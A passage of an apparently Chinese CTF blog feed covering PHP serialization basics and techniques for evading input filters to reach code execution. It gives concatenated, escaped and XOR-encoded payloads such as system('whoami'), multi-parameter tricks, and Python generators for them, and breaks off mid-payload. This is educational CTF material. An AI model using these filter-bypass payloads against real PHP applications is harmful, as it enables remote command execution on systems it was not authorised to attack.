class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>在网上找到一个比较形象的例子</p><blockquote><p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p></blockquote><p>php 将数据序列化和反序列化会用到两个函数</p><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><p>序列化的目的是方便数据的传输和存储，在 PHP 中，序列化和反序列化一般用做缓存，比如 session 缓存，cookie 等。</p><h3 id="常见的序列化格式"><a class="markdownIt-Anchor" href="#常见的序列化格式">#</a> 常见的序列化格式</h3><p>了解即可</p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><h3 id="案例引入"><a class="markdownIt-Anchor" href="#案例引入">#</a> 案例引入</h3><p>简单的例子 (以数组为例子)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; xiao</span><br><span class="line">    [<span class="number">1</span>] =&gt; shi</span><br><span class="line">    [<span class="number">2</span>] =&gt; zi</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们对上面这个例子做个简单讲解，方便大家入门</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line">a:<span class="keyword">array</span>代表是数组，后面的<span class="number">3</span>说明有三个属性</span><br><span class="line">i:代表是整型数据<span class="keyword">int</span>，后面的<span class="number">0</span>是数组下标</span><br><span class="line">s:代表是字符串，后面的<span class="number">4</span>是因为xiao长度为<span class="number">4</span></span><br><span class="line">    </span><br><span class="line">依次类推</span><br></pre></td></tr></table></figure><p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出 (O 代表 Object 是对象的意思，也是类)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>而如果变量前是 protected，则会在变量名前加上 <code>\x00*\x00</code> ,private 则会在变量名前加上 <code>\x00类名\x00</code> , 输出时一般需要 url 编码，若在本地存储更推荐采用 base64 编码的形式，如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时候输出则会导致不可见字符 <code>\x00</code>  的丢失 (故要 urlencode)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="反序列化绕过小trick"><a class="markdownIt-Anchor" href="#反序列化绕过小trick">#</a> 反序列化绕过小 Trick</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则绕过</title>
      <link href="/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
      <url>/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="代码执行函数"><a class="markdownIt-Anchor" href="#代码执行函数">#</a> <strong>代码执行函数</strong></h2><p>首先</p><p><strong>eval()</strong></p><p>最常见的代码执行函数 把字符串 code 作为 PHP 代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><p>检测一个断言是否为 <strong>false</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p><code>assert()</code>  会检查指定的 <code>assertion</code>  并在结果为 <code>false</code>  时采取适当的行动。在 <code>PHP5</code>  或 <code>PHP7</code>  中，如果 <code>assertion</code>  是字符串，它将会被 <code>assert()</code>  当做 <code>PHP</code>  代码来执行。</p><p><strong>preg_replace()+/e</strong></p><p>执行一个正则表达式的搜索和替换（一般用来）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>搜索 <code>subject</code>  中匹配 <code>pattern</code>  的部分，以 <code>replacement</code>  进行替换。如果 <code>pattern</code>  的模式修饰符使用 <code>/e</code> ，那么当 <code>subject</code>  被匹配成功时， <code>replacement</code>  会被当做 PHP 代码执行</p><blockquote><p><strong>PS：  <code>preg_replace()+</code>  函数的 <code>/e</code>  修饰符在 <code>PHP7</code>  中被移除</strong></p></blockquote><p><strong>create_function()</strong></p><p>创建一个匿名 (lambda 样式) 函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造 payload 传递给 <code>create_function()</code>  对 <code>参数或函数体</code> <br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102205746960.png?raw=true" alt="在这里插入图片描述"></p><h2 id="可回调函数"><a class="markdownIt-Anchor" href="#可回调函数">#</a> <strong>可回调函数</strong></h2><p><strong>array_map()</strong></p><p>为数组的每个元素应用回调函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array</span> , <span class="keyword">array</span> ...<span class="variable">$arrays</span> ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>返回数组，是为 <code>array</code>  每个元素应用 <code>callback</code>  函数之后的数组。  <code>array_map()</code>  返回一个 <code>array</code> ，数组内容为 <code>array1</code>  的元素按索引顺序为参数调用 <code>callback</code>  后的结果（有更多数组时，还会传入 <code>arrays</code>  的元素）。  <code>callback</code>  函数形参的数量必须匹配 <code>array_map()</code>  实参中数组的数量。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021010221241094.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func()</strong></p><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 <code>callback</code>  是被调用的回调函数，其余参数是回调函数的参数。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102215723117.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func_array()</strong></p><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>把第一个参数作为回调函数 <code>callback</code>  调用，把参数数组作 <code>param_arr</code>  为回调函数的的参数传入。跟 <code>array_map()</code>  相似</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220152139.png?raw=true" alt="在这里插入图片描述"></p><p><strong>array_filter()</strong></p><p>用回调函数过滤数组中的单元</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>依次将 <code>array</code>  数组中的每个值传递到 <code>callback</code>  函数。如果 <code>callback</code>  函数返回 <code>true</code> ，则 <code>array</code>  数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220700697.png?raw=true" alt="在这里插入图片描述"></p><p><strong>usort()</strong></p><p>使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span> ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">callable</span> <span class="variable">$value_compare_func</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>当 <code>PHP &lt; 5.6</code>  时</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103123448401.png?raw=true" alt="在这里插入图片描述"></p><p>当 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时，php 有一个 <code>参数变长</code> 特性</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103205857483.png?raw=true" alt="在这里插入图片描述"></p><h2 id="字符串拼接绕过"><a class="markdownIt-Anchor" href="#字符串拼接绕过">#</a> <strong>字符串拼接绕过</strong></h2><p>字符串拼接绕过适用于过滤具体关键字的限制</p><p>使用 PHP &gt;=7</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103225920322.png?raw=true" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><blockquote><p>在 PHP 中不一定需要 <code>引号(单引号/双引号)</code>  来表示字符串。PHP 支持我们声明元素的类型，比如 <code>$name = (string)mochu7;</code> ，在这种情况下， <code>$name</code>  就包含字符串 <code>&quot;mochu7&quot;</code> ，此外，如果不显示声明类型，那么 PHP 会将 <code>圆括号内的数据当成字符串</code> 来处理</p></blockquote><h2 id="字符串转义绕过"><a class="markdownIt-Anchor" href="#字符串转义绕过">#</a> <strong>字符串转义绕过</strong></h2><p>适用版本 PHP&gt;=7</p><p>以八进制表示的 <code>\[0–7]&#123;1,3&#125;</code>  转义字符会自动适配 byte（如 <code>&quot;\400&quot; == “\000”</code> ）<br>以十六进制的 <code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>  转义字符表示法（如 <code>“\x41&quot;</code> ）<br>以 Unicode 表示的 <code>\u&#123;[0–9A-Fa-f]+&#125;</code>  字符，会输出为 UTF-8 字符串</p><p>payload 处理脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">hex_payload(payload)</span><br><span class="line">oct_payload(payload)</span><br><span class="line">uni_payload(payload)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;</span>();<span class="comment">#phpinfo();</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;</span>(<span class="string">&#x27;id&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104173537720.png?raw=true" alt="在这里插入图片描述"></p><p>另外，八进制的方法可以绕过 <code>无字母传参</code> 进行代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104180029425.png?raw=true" alt="在这里插入图片描述"></p><h2 id="多次传参绕过"><a class="markdownIt-Anchor" href="#多次传参绕过">#</a> <strong>多次传参绕过</strong></h2><p>如果过滤了 <code>引号(单引号/双引号)</code> ，可以通过以下方法绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104185804485.png?raw=true" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?<span class="number">1</span>=system&amp;<span class="number">2</span>=whoami</span><br><span class="line">POST:</span><br><span class="line">cmd=<span class="variable">$_GET</span>[<span class="number">1</span>](<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>如果 <code>PHP版本大于7</code>  这里还可以用拼接的方法绕过过滤引号</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(sy.st.em)(whoami);</span><br></pre></td></tr></table></figure><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104203723764.png?raw=true" alt="在这里插入图片描述"></p><p>回调函数可能大部分看限制的具体长度，但是在 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时对以上过滤方法可以绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104211408314.png?raw=true" alt="在这里插入图片描述"></p><h2 id="内置函数访问绕过"><a class="markdownIt-Anchor" href="#内置函数访问绕过">#</a> 内置函数访问绕过</h2><p><code>get_defined_functions()</code> ：返回所有已定义函数的数组</p><p>利用这种方法首先还需要知道 PHP 的具体版本，因为每个版本的 <code>get_defined_functions()</code>  返回的值都是不一样的，这里以 <code>php7.4.3</code>  为准</p><p><img src="https://img-blog.csdnimg.cn/20210104224616126.png" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225436558.png?raw=true" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225532878.png?raw=true" alt="在这里插入图片描述"></p><h2 id="异或过滤"><a class="markdownIt-Anchor" href="#异或过滤">#</a> <strong>异或过滤</strong></h2><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或  <code>?</code>  和  <code>~</code>  之后得到的是  <code>A</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure><p>接下来看一道例题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了 <code>所有英文字母和数字</code> ，但是我们知道 ASCII 码中还有很多 <code>字母数字之外的字符</code> ，利用这些字符进行异或可以得到我们想要的字符</p><blockquote><p>PS：取 ASCII 表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p></blockquote><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line"><span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span 